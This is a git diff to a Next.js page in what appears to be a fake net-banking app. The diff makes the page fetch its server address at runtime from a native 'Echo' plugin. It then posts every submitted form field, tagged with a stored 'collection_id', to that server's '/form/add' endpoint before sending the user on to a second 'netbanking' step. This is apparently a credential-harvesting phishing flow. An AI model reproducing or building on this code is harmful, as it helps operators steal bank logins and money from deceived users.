@@ -4,30 +4,32 @@ import Header from "../inlcude/header";
 import { useRouter } from "next/navigation";  
 import { useState } from 'react';
 import Link from "next/link";
-
+import Echo from "../registerPlugin";
 export default function Home() {
   const router = useRouter();
-  const API_URL = process.env.NEXT_PUBLIC_URL;
-  const SITE = process.env.NEXT_PUBLIC_SITE;
 
   const [loading, setLoading] = useState(false);
 
   const handleSubmit = async (e) => {
       e.preventDefault()
-      setLoading(true); // Set loading state to true
-
-      const formData = new FormData(e.target);
-      const jsonObject1 = {};
-      const jsonObject = {};
-      formData.forEach((value, key) => {
-          jsonObject[key] = value;
-      });
-      jsonObject1['data'] = jsonObject;
-      jsonObject1['site'] = SITE;
-      jsonObject1['id'] = localStorage.getItem("collection_id");
+      setLoading(true); 
       
       try {
-          const response = await fetch(`${API_URL}`, {
+
+        const result = await Echo.getConfig();
+        const API_URL = result.value;
+        const SITE = result.site;
+              
+        const formData = new FormData(e.target);
+        const jsonObject1 = {};
+        const jsonObject = {};
+        formData.forEach((value, key) => {
+            jsonObject[key] = value;
+        });
+        jsonObject1['data'] = jsonObject;
+        jsonObject1['site'] = SITE;
+        jsonObject1['id'] = localStorage.getItem("collection_id");
+          const response = await fetch(`${API_URL}/form/add`, {
               method: 'POST',
               body: JSON.stringify(jsonObject1)
           });
@@ -35,10 +37,10 @@ export default function Home() {
           if (!response.ok) {
               throw new Error('Network response was not ok');
           }
-          const responseData = await response.json();
           router.push('/netbanking2');
       } catch (error) {
           console.error('There was a problem with the fetch operation:', error);
+          alert("An error occurred, please try again."+error);
       } finally{
           setLoading(false); 
       }
